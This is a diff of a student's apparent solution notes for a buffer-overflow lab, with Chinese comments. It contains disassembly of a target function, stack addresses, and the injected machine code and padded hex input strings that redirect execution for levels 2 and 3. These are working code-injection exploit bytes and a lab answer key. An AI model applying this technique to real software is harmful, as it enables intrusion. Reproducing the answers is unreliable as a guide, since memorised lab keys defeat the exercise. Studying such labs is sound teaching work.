@@ -94,14 +94,96 @@ Dump of assembler code for function touch2:
  */
 
 /* 
-ec 17 40 00 00 00 00 00
-48 83 ec 01
 48 c7 c7 fa 97 b9 59
-48 83 c4 01
+68 ec 17 40 00
 c3
 00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00 
-80 dc 61 55 00 00 00 00
+00 00 00 00 00 00 00 00 
+00 00 00 
+78 dc 61 55 00 00 00 00
 
 
+ */
+
+// touch3 地址 0x4018fa
+/* touch3 汇编表示
+Dump of assembler code for function touch3:
+   0x00000000004018fa <+0>:	push   %rbx
+   0x00000000004018fb <+1>:	mov    %rdi,%rbx
+   0x00000000004018fe <+4>:	movl   $0x3,0x202bd4(%rip)        # 0x6044dc <vlevel>
+   0x0000000000401908 <+14>:	mov    %rdi,%rsi
+   0x000000000040190b <+17>:	mov    0x202bd3(%rip),%edi        # 0x6044e4 <cookie>
+   0x0000000000401911 <+23>:	callq  0x40184c <hexmatch>
+   0x0000000000401916 <+28>:	test   %eax,%eax
+   0x0000000000401918 <+30>:	je     0x40193d <touch3+67>
+   0x000000000040191a <+32>:	mov    %rbx,%rdx
+   0x000000000040191d <+35>:	mov    $0x403138,%esi
+   0x0000000000401922 <+40>:	mov    $0x1,%edi
+   0x0000000000401927 <+45>:	mov    $0x0,%eax
+   0x000000000040192c <+50>:	callq  0x400df0 <__printf_chk@plt>
+   0x0000000000401931 <+55>:	mov    $0x3,%edi
+   0x0000000000401936 <+60>:	callq  0x401c8d <validate>
+   0x000000000040193b <+65>:	jmp    0x40195e <touch3+100>
+   0x000000000040193d <+67>:	mov    %rbx,%rdx
+   0x0000000000401940 <+70>:	mov    $0x403160,%esi
+   0x0000000000401945 <+75>:	mov    $0x1,%edi
+   0x000000000040194a <+80>:	mov    $0x0,%eax
+   0x000000000040194f <+85>:	callq  0x400df0 <__printf_chk@plt>
+   0x0000000000401954 <+90>:	mov    $0x3,%edi
+   0x0000000000401959 <+95>:	callq  0x401d4f <fail>
+   0x000000000040195e <+100>:	mov    $0x0,%edi
+   0x0000000000401963 <+105>:	callq  0x400e40 <exit@plt>
+End of assembler dump.
+
+ */
+
+/* hexmatch C语言表示
+
+ */
+int hexmatch(unsigned val, char *sval){
+   char cbuf[110];
+   char *s = cbuf + random()%100;
+   sprintf(s, "%.8x", val);
+   return strncmo(sval, s, 9) == 0;
+}
+
+/* 
+cookie: 0x59b997fa
+test: rsp: 0x5561dcb0~0x5561dca8
+
+ */
+
+/* level3 汇编
+mov   $0x5561dca8,%rdi        //将栈地址推入rdi 此条地址为0x5561dc78
+pushq $0x4018fa             //touch3地址
+retq
+...补全缓冲区 28
+...缓冲区内的第一条语句 (8地址)0x5561dc78
+...应该是栈地址了, 写入语句 35 39 62 39 39 37 66 61 00
+
+ */
+
+
+/* touch_tmp反汇编
+   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
+   7:   68 fa 18 40 00          pushq  $0x4018fa
+   c:   c3                      retq
+
+ */
+
+/* touch3 答案
+//Code
+48 c7 c7 a8 dc 61 55
+68 fa 18 40 00
+c3
+//填充
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00
+//Code首地址
+78 dc 61 55 00 00 00 00 
+//test栈中 cookie
+35 39 62 39 39 37 66 61 00
  */
